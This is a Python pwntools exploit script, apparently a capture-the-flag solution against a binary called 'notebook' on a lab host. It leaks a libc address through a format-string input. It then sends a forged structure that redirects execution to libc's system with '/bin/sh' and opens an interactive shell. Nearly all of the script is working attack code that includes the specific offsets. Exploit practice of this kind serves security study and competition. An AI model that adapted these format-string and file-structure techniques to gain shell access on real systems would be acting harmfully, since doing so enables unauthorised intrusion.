#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 10.10.23.10 --port 2228 notebook
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('notebook')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '10.10.23.10'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(['./ld-2.27.so', exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./lib'

io = start(env={'LD_PRELOAD': './libc-2.27.so'})

def write(val):
    io.sendlineafter('> ', '1')
    io.sendafter('> ', val)

def read():
    io.sendlineafter('> ', '2')

def go():
    io.sendlineafter('> ', '3')


write(b'%11$p\x00')
read()
io.recvuntil(b'wrote.\n')
addr = int(io.recv('14'), 16)
log.success(f'libc: {addr:x}')
libc = ELF('./libc-2.27.so')
libc.address = addr - (0x00007fbf35a21b8e - 0x00007fbf35a00000)

log.success(f'libc: {libc.address:x}')

pl = p64(0x4040d0) + p64(0xdead)
pl += p64(0x8000) + p64(0)
pl += p64(0) + p64(0)
pl += p64(0) + p64(0)
pl += p64(0) + p64(next(libc.search(b'/bin/sh\x00')))
pl += p64(0) + p64(0)
pl += p64(0) + p64(0)
pl += p64(0) + p64(libc.address + 0x7f2eaa9b0680 - 0x00007f2eaa600000)
pl += p64(0) + p64(0)
pl += p64(0) + p64(0x4040f0)
pl += p64(0xffffffffffffffff) + p64(0)
pl += p64(0x404100) + p64(0)
pl += p64(0) + p64(0)
pl += p64(0) + p64(0)
# pl += p64(0) + p64(0x4040c8 - 8*16)
pl += p64(0) + p64(libc.address + (0x3AC360))
pl += p64(libc.sym.system)
pl += p64(libc.sym.system)

pause()
print(hex(len(pl)))
write(pl)
pause()
go()

io.interactive()

